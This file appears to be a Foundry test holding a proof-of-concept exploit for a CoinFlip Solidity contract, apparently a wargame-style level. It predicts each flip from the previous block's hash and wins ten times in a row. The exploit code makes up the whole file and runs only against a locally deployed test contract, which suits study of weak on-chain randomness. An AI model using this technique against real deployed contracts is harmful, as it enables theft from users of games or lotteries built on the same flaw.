// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";


contract CoinFlip_POC is Test {
    CoinFlip _coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function init() private{
        vm.startPrank(address(0x1));
        _coinflip =new CoinFlip();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_CoinFlip_POC() public{
        for(uint256 i=100;;i++){
            vm.roll(i);
            uint256 blockValue = uint256(blockhash(i - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            _coinflip.flip(side);
            if(_coinflip.consecutiveWins() == 10)
                break;
        }
        
        console.log("success:",_coinflip.consecutiveWins() == 10);
    }
}
